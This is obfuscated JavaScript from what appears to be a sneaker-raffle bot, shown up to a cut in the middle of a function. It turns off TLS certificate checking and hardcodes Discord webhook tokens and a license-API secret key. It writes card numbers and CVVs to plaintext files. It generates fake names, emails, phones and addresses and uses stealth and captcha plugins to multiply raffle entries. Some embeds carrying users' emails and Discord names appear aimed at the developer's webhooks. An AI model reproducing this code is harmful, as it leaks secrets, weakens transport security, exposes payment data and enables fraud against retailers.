process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x3f8380 = require('fs'), _0x3aa343 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4fee09(_0x41e2b0) {
    const _0x394141 = _0x3f8380['createWriteStream'](_0x41e2b0, { 'flags': 'a' }), _0x3331ec = console['log'];
    console['log'] = function () {
        const _0x1edbf5 = Array['prototype']['slice']['call'](arguments), _0xc6cdb4 = _0x1edbf5['join']('\x20') + '\x0a';
        _0x394141['write'](_0xc6cdb4), _0x3331ec['apply'](console, _0x1edbf5);
    };
}
_0x4fee09('../logs/log\x20' + _0x3aa343);
var _0x248c22 = require('tough-cookie'), _0x2a51ab = require('node-imap'), _0x73c16 = require('util')['inspect'];
const _0xfebb = require('mailparser')['simpleParser'], { EmbedBuilder: _0x27c876 } = require('discord.js');
var _0x46006b = require('exe');
const { execFile: _0x4fa3d0 } = require('child_process'), _0x39c115 = require('puppeteer-extra'), _0x63578e = require('puppeteer-extra-plugin-recaptcha'), _0x5cc924 = require('puppeteer-extra-plugin-stealth'), _0x2c0b56 = require('chalk'), _0x5c316f = require('node-bash-title'), _0x529551 = require('axios'), _0x11f8e1 = require('papaparse');
var _0x28d255 = require('random-name');
const _0x497c42 = require('request');
var _0x4e7197 = require('prompt');
const _0x4e0120 = _0x497c42['jar']();
var _0x51f80a = {};
const _0x106215 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x45f388 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x901726 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xe7dae1 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3b1e92 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1a4f07 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x55571e = 'https://discord.com/api/webhooks/', _0x17d134 = '' + _0x55571e + _0x901726, _0x53db35 = '' + _0x55571e + _0xe7dae1, _0x43acb0 = '' + _0x55571e + _0x106215, _0x1dec8a = '' + _0x55571e + _0x45f388, _0x255a14 = '' + _0x55571e + _0x3b1e92, _0x15717f = '' + _0x55571e + _0x1a4f07;
const _0x47fbb = JSON['parse'](_0x3f8380['readFileSync']('../package.json', 'utf-8')), _0x585daf = _0x47fbb['version'];
var _0x49db92, _0x33a3cd, _0x32b994, _0x11828c, _0x25459a, _0x444f9b, _0x5ad930, _0x6db3dc;
const _0x3fe5d1 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2c10cc = ![];
const _0x2487dd = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x417f3d = '0123456789';
var _0x2c5065 = _0x2487dd['split']('');
const _0x525af9 = require('auto-git-update'), _0x352a78 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x4b24a1 = new _0x525af9(_0x352a78);
async function _0x439f5a() {
    _0x25459a = _0x3f8380['readdirSync']('../proxies'), _0x11828c = _0x3f8380['readdirSync']('../tasks'), !_0x3f8380['existsSync']('../accounts/fenom.csv') && _0x3f8380['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3f8380['existsSync']('../accounts/paypal.csv') && _0x3f8380['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x3f8380['existsSync']('../accounts/bstn.csv') && _0x3f8380['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3f8380['existsSync']('../accounts/eql.csv') && _0x3f8380['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3f8380['existsSync']('../failed-tasks.csv') && _0x3f8380['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3f8380['existsSync']('../successful-tasks.csv') && _0x3f8380['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x51f80a = JSON['parse'](_0x3f8380['readFileSync']('../settings.json', 'utf-8')), !_0x51f80a['delay'] && (_0x51f80a['delay'] = 0x3c, _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['threads'] && (_0x51f80a['threads'] = 0x1, _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['masterMail'] && (_0x51f80a['masterMail'] = 'yourmail@gmail.com', _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['masterPassword'] && (_0x51f80a['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['captchaKey'] && (_0x51f80a['captchaKey'] = '', _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['useRandomProxy'] && (_0x51f80a['useRandomProxy'] = !![], _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['shuffleTasks'] && (_0x51f80a['shuffleTasks'] = ![], _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), !_0x51f80a['webhook'] && (_0x51f80a['webhook'] = '', _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), _0x51f80a['delay'] <= 0x1388 && (_0x51f80a['delay'] = _0x51f80a['delay'] * 0x3e8), _0x51f80a['AfewDelay'] && (delete _0x51f80a['AfewDelay'], _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), _0x51f80a['MahaDelay'] && (delete _0x51f80a['MahaDelay'], _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), _0x51f80a['footshopDelay'] && (delete _0x51f80a['footshopDelay'], _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a, null, 0x2))), _0x51f80a['MahaDelay'] = _0x51f80a['delay'], _0x55571e = _0x51f80a['webhook'], _0x444f9b = _0x51f80a['licenseKey'];
}
let _0x2481a2, _0x248667 = [], _0x42dcfb;
const _0xf987cc = _0x3e55c2 => new Promise(_0x5cff6a => setTimeout(_0x5cff6a, _0x3e55c2));
function _0x5ab5b3(_0x4415dd, _0x3fe30f) {
    return Math['floor'](Math['random']() * (_0x3fe30f - _0x4415dd + 0x1) + _0x4415dd);
}
function _0x37d4dd(_0x258060) {
    let _0x5091eb = _0x258060['length'], _0x2dafb6;
    while (_0x5091eb != 0x0) {
        _0x2dafb6 = Math['floor'](Math['random']() * _0x5091eb), _0x5091eb--, [_0x258060[_0x5091eb], _0x258060[_0x2dafb6]] = [
            _0x258060[_0x2dafb6],
            _0x258060[_0x5091eb]
        ];
    }
    return _0x258060;
}
async function _0x1a2af7(_0x3b3d52) {
    return _0x529551['get']('https://api.hyper.co/v4/licenses/' + _0x3b3d52, { 'headers': { 'Authorization': 'Bearer\x20' + _0x3fe5d1 } })['then'](_0x19af95 => _0x19af95['data'])['catch'](() => null);
}
;
async function _0x1e58b9(_0x5325f0) {
    console['clear']();
    if (_0x5325f0 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x11775d = await _0x4e7197['get']('License');
        if (_0x11775d['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xf987cc(0xbb8), _0x1e58b9(_0x5325f0);
        _0x5325f0 = _0x11775d['License'], _0x51f80a['licenseKey'] = _0x5325f0, _0x444f9b = _0x5325f0, _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a));
    }
    console['log']('Checking\x20license\x20' + _0x444f9b + '...'), await _0xf987cc(0x320);
    const _0x2c9003 = await _0x1a2af7(_0x5325f0);
    _0x5ad930 = JSON['stringify'](_0x2c9003['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x6db3dc = JSON['stringify'](_0x2c9003['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x2c9003)
        return console['log']('License\x20not\x20found');
    if (!_0x2c9003['user'])
        return console['log']('License\x20not\x20bound');
    return _0x2c9003['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2c10cc = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2c10cc = ![]);
}
async function _0x22af56() {
    var _0x34a642 = await _0x4e7197['get']('Module');
    return console['clear'](), _0x34a642['Module'];
}
;
async function _0x3bac9e() {
    var _0x12d934 = await _0x4e7197['get']('Setting');
    return console['clear'](), _0x12d934['Setting'];
}
async function _0x39dc5d(_0xd56c30) {
    var _0x13aa8f = [];
    for (file of _0x11828c) {
        var _0x336cf9 = _0x3f8380['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x11f8e1['parse'](_0x336cf9, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0xd56c30['store'] && _0x13aa8f['push'](file);
    }
    !_0x13aa8f['length'] == 0x0 && (_0x11828c = _0x13aa8f);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x421668 = 0x0; _0x421668 < _0x11828c['length']; _0x421668++) {
        console['log']('\x20(' + _0x421668 + ')\x20' + _0x11828c[_0x421668]);
    }
    console['log']('');
    var _0x3a6dde = await _0x4e7197['get']('Task');
    if (_0x3a6dde['Task'] > _0x11828c['length'] - 0x1 || isNaN(_0x3a6dde['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xf987cc(0x3e8), _0x39dc5d();
    var _0x14f134 = _0x3f8380['readFileSync']('../tasks/' + _0x11828c[_0x3a6dde['Task']], 'utf-8');
    return _0x32b994 = _0x11f8e1['parse'](_0x14f134, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x2c0b56['blue'](_0x11828c[_0x3a6dde['Task']])), _0x49db92 = _0x11828c[_0x3a6dde['Task']], _0x32b994;
}
async function _0x3a4071() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x2623e5 = 0x0; _0x2623e5 < _0x25459a['length']; _0x2623e5++) {
        console['log']('\x20(' + _0x2623e5 + ')\x20' + _0x25459a[_0x2623e5]);
    }
    console['log']('');
    var _0x206e1d = await _0x4e7197['get']('Proxies');
    if (_0x206e1d['Proxies'] > _0x25459a['length'] - 0x1 || isNaN(_0x206e1d['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xf987cc(0x3e8), _0x3a4071();
    var _0x2ede68 = _0x3f8380['readFileSync']('../proxies/' + _0x25459a[_0x206e1d['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2dadc5 = _0x2ede68['map']((_0x20e0f2, _0x19424f) => {
        sanatizeProxy = _0x20e0f2['replace']('\x0d', '');
        if (_0x2ede68[_0x19424f + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x33a3cd = _0x25459a[_0x206e1d['Proxies']], console['clear'](), _0x2dadc5;
}
async function _0x1ca085() {
    var _0x4baf98 = await _0x4e7197['get']('Value');
    return console['clear'](), _0x4baf98['Value'];
}
async function _0x5c91d0(_0x563b49) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x2278a1 = 0x0; _0x2278a1 < _0x563b49['length']; _0x2278a1++) {
        console['log']('\x20(' + _0x2278a1 + ')\x20[' + _0x563b49[_0x2278a1]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x5e0b47 = await _0x4e7197['get']('Module');
    return _0x5e0b47['Module'];
}
async function _0x43fc53() {
    var _0x2a7da6 = await _0x4e7197['get']('Password');
    return console['clear'](), _0x2a7da6['Password'];
}
;
async function _0x480db6() {
    var _0x12c219 = await _0x4e7197['get']('Links');
    return _0x12c219['Links'];
}
;
async function _0x34d0f3() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x3da0f1 = 0x0; _0x3da0f1 < _0x248667['length']; _0x3da0f1++) {
        console['log']('\x20(' + _0x3da0f1 + ')\x20' + _0x248667[_0x3da0f1]);
    }
    ;
    console['log']();
    let _0x48818f = await _0x4e7197['get']('Product');
    return console['clear'](), _0x48818f['Product'];
}
;
function _0x5c3ac1() {
    var _0x58f297 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x58f297;
}
;
function _0x352899() {
    var _0x1925d3 = new Date(Date['now']())['toLocaleString']();
    return _0x1925d3['replace'](',', '');
}
async function _0x215470(_0x3330a4, _0x48b4f5) {
    let _0x2699bf = { 'headers': { 'content-type': 'application/json' } };
    if (_0x585daf != 'devkey') {
        await _0x529551['post'](_0x3330a4, _0x48b4f5, _0x2699bf);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x539676(_0x42f018, _0x487c59, _0x11eea0, _0x2cd878, _0x440f51) {
    if (!_0x2cd878 && _0x11eea0 == 'dev') {
        var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x487c59['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x487c59['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x42f018['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x51f80a['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5ad930,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x42f018['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x42f018['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x585daf,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2b3825['data'];
    } else {
        if (_0x2cd878 && _0x11eea0 == 'dev') {
            var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x487c59['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5ad930,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x487c59['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x42f018['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x51f80a['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x440f51,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x42f018['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x42f018['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x585daf,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2b3825['data'];
        } else {
            if (_0x11eea0 == 'pub') {
                var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x487c59['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x487c59['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x42f018['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x51f80a['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x42f018['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x585daf,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2b3825['data'];
            } else {
                if (_0x11eea0 == 'acc' && !_0x2cd878) {
                    var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x487c59['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5ad930,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x487c59['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x51f80a['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x585daf,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2b3825['data'];
                } else {
                    if (_0x11eea0 == 'acc' && _0x2cd878) {
                        var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x487c59['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5ad930,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x440f51,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x487c59['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x51f80a['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x585daf,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2b3825['data'];
                    } else {
                        if (_0x11eea0 == 'open') {
                            var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x6db3dc)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5ad930,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x585daf,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2b3825['data'];
                        } else {
                            if (!_0x2cd878 && _0x11eea0 == 'ver') {
                                var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x487c59['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5ad930,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x487c59['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x51f80a['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x585daf,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2b3825['data'];
                            } else {
                                if (_0x2cd878 && _0x11eea0 == 'ver') {
                                    var _0x2b3825 = new _0x27c876()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x487c59['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5ad930,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x440f51,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x487c59['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x51f80a['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x585daf,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x2b3825['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3d5d40(_0x5bf090, _0x1e5aa7) {
    var _0xd0ef09 = _0x5bf090[_0x1e5aa7]['Address1']['split'](''), _0x46f485 = _0x5bf090[_0x1e5aa7]['Address2']['split'](''), _0xb350aa = _0x5bf090[_0x1e5aa7]['Email']['split']('@');
    for (var _0x38c46d = 0x0; _0x38c46d < _0xd0ef09['length']; _0x38c46d++) {
        if (_0xd0ef09[_0x38c46d] == 'X') {
            var _0x2ed6dc = Math['round'](Math['random']() * (_0x2487dd['length'] - 0x1));
            _0xd0ef09[_0x38c46d] = _0x2c5065[_0x2ed6dc];
        }
    }
    ;
    for (var _0x38c46d = 0x0; _0x38c46d < _0x46f485['length']; _0x38c46d++) {
        if (_0x46f485[_0x38c46d] == 'X') {
            var _0x2ed6dc = Math['round'](Math['random']() * (_0x2487dd['length'] - 0x1));
            _0x46f485[_0x38c46d] = _0x2c5065[_0x2ed6dc];
        }
    }
    ;
    _0x5bf090[_0x1e5aa7]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x5bf090[_0x1e5aa7]['FirstName'] = _0x28d255['first']());
    _0x5bf090[_0x1e5aa7]['LastName']['toUpperCase']() == 'RANDOM' && (_0x5bf090[_0x1e5aa7]['LastName'] = _0x28d255['last']());
    _0xb350aa[0x0]['toUpperCase']() == 'RANDOM' ? _0xb350aa[0x0] = '' + _0x28d255['first']() + _0x28d255['last']() + _0x5ab5b3(0x1, 0x270f) + '@' : _0xb350aa[0x0] = _0xb350aa[0x0] + '@';
    _0x5bf090[_0x1e5aa7]['Email'] = _0xb350aa['join'](''), _0x5bf090[_0x1e5aa7]['Address1'] = _0xd0ef09['join'](''), _0x5bf090[_0x1e5aa7]['Address2'] = _0x46f485['join']('');
    _0x5bf090[_0x1e5aa7]['Phone'] == 'RANDOM' && (_0x5bf090[_0x1e5aa7]['Phone'] = '0' + _0x5ab5b3(0x5f5e100, 0x3b9ac9ff));
    if (_0x5bf090[_0x1e5aa7]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x1cecf9 = _0x5ab5b3(0x1, 0x270f);
        _0x5bf090[_0x1e5aa7]['Follower'] = '' + _0x28d255['first']() + _0x28d255['last']() + _0x1cecf9 + '\x20';
    }
    _0x5bf090[_0x1e5aa7]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x5bf090[_0x1e5aa7]['HouseNumber'] = _0x5ab5b3(0x1, 0xc8));
    if (_0x5bf090[_0x1e5aa7]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x14c03f = Math['round'](Math['random']() * (_0x2487dd['length'] - 0x1)), _0x14d563 = _0x2c5065[_0x14c03f];
        _0x5bf090[_0x1e5aa7]['Address1'] = _0x28d255['last']() + 'straat', _0x5bf090[_0x1e5aa7]['Zip'] == '' && (_0x5bf090[_0x1e5aa7]['Postcode'] = _0x5ab5b3(0x3e8, 0x270f) + '\x20' + _0x14d563 + _0x14d563, _0x5bf090[_0x1e5aa7]['Zip'] = _0x5bf090[_0x1e5aa7]['Postcode']), _0x5bf090[_0x1e5aa7]['HouseNumber'] = '' + _0x5ab5b3(0x1, 0xc8);
    }
    return;
}
;
async function _0x46ac44(_0x6d4842, _0x3fe282) {
    _0x3f8380['appendFileSync']('../failed-tasks.csv', _0x352899() + ',' + _0x3fe282['store'] + ',' + _0x3fe282['name'] + ',' + _0x6d4842['Url'] + ',' + _0x6d4842['Size'] + ',' + _0x6d4842['Follower'] + ',' + _0x6d4842['FirstName'] + ',' + _0x6d4842['LastName'] + ',' + _0x6d4842['Address1'] + ',' + _0x6d4842['Address2'] + ',' + _0x6d4842['HouseNumber'] + ',' + _0x6d4842['Zip'] + ',' + _0x6d4842['City'] + ',' + _0x6d4842['State'] + ',' + _0x6d4842['Country'] + ',' + _0x6d4842['Phone'] + ',' + _0x6d4842['Email'] + ',' + _0x6d4842['Password'] + ',' + _0x6d4842['PaymentMethod'] + ',' + _0x6d4842['CardType'] + ',' + _0x6d4842['NameOnCard'] + ',' + _0x6d4842['CardNumber'] + ',' + _0x6d4842['ExpiryDate'] + ',' + _0x6d4842['CVV'] + ',' + _0x6d4842['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x46ba09(_0x266f65, _0x309c74) {
    _0x3f8380['appendFileSync']('../successful-tasks.csv', _0x352899() + ',' + _0x309c74['store'] + ',' + _0x309c74['name'] + ',' + _0x266f65['Url'] + ',' + _0x266f65['Size'] + ',' + _0x266f65['Follower'] + ',' + _0x266f65['FirstName'] + ',' + _0x266f65['LastName'] + ',' + _0x266f65['Address1'] + ',' + _0x266f65['Address2'] + ',' + _0x266f65['HouseNumber'] + ',' + _0x266f65['Zip'] + ',' + _0x266f65['City'] + ',' + _0x266f65['State'] + ',' + _0x266f65['Country'] + ',' + _0x266f65['Phone'] + ',' + _0x266f65['Email'] + ',' + _0x266f65['Password'] + ',' + _0x266f65['PaymentMethod'] + ',' + _0x266f65['CardType'] + ',' + _0x266f65['NameOnCard'] + ',' + _0x266f65['CardNumber'] + ',' + _0x266f65['ExpiryDate'] + ',' + _0x266f65['CVV'] + ',' + _0x266f65['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x558a9f() {
    let _0x274fe6 = proxyFile['split']('\x0a'), _0x3aa1d0 = _0x274fe6['map']((_0x13284f, _0x214fe7) => {
        sanatizeProxy = _0x13284f['replace']('\x0d', '');
        if (_0x274fe6[_0x214fe7 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3aa1d0;
}
;
async function _0x48b106(_0x2f3f20, _0xede088) {
    if (_0x58760c != 'yes')
        var _0x58760c = '', _0x353f10 = 0x0;
    async function _0x5e5eab() {
        var _0x59619a = _0x3f8380['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x5994b2 = _0x11f8e1['parse'](_0x59619a, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x5cd033 = 0x0; _0x5cd033 < _0x5994b2['length']; _0x5cd033++) {
            console['log']('(' + _0x5cd033 + ')\x20' + _0x5994b2[_0x5cd033]['Email']);
        }
        console['log']('\x0a(' + _0x5994b2['length'] + ')\x20' + _0x2c0b56['cyan']('Add\x20a\x20new\x20account'));
        let _0x181120 = await _0x4e7197['get']('Option');
        if (_0x181120['Option'] < _0x5994b2['length'])
            return _0x5994b2[_0x181120['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x189eb6 = {}, _0x461028 = await _0x4e7197['get']('Email');
        _0x189eb6['Email'] = _0x461028['Email'];
        var _0x36999f = Math['round'](Math['random']() * (_0xede088['length'] - 0x1));
